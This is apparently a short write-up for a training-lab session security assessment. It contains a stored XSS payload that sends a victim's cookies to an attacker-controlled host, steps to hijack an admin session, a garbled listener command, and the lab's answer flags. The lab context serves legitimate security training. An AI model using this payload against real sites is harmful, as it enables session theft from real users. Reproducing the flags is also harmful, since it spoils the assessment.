# Session Security - Skills Assessment

You are currently participating in a bug bounty program.

* The only URL in scope is `http://minilab.htb.net`
* Attacking end-users through client-side attacks is in scope for this particular bug bounty program.
* Test account credentials:
  * Email: heavycat106
  * Password: rocknrol
* Through dirbusting, you identified the following endpoint `http://minilab.htb.net/submit-solution`

Find a way to hijack an admin's session. Once you do that, answer the two questions below.

**Questions**

Read the flag residing in the admin's public profile. Answer format: \[string]

```bash
#https://ytnuobgub.gitbook.io/redteam/htb-academy-web-modules-for-cbbh/session-security
#Create a log.php script to capture the cookie of user upon logging in to user public profile.
vim log.php
sudo -S 10.10.14.228:8080
#login with Email: heavycat106 Password: rocknrol
#Country input field is vulnerable to XSS injection
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://10.10.14.228:8080/log.php?c=' + document.cookie;"></video>
#Now we can use the API endpoint to make the Administrator visit public profile URL.
http://minilab.htb.net/profile?email=julie.rogers@example.com
#Use that cookie in current session via developer tools after URL decode
[YOU_ARE_A_SESSION_WARRIOR]
```

Go through the PCAP file residing in the admin's public profile and identify the flag. Answer format: FLAG{string}

```
FLAG{SUCCESS_YOU_PWN3D_US_H0PE_YOU_ENJ0YED}
```
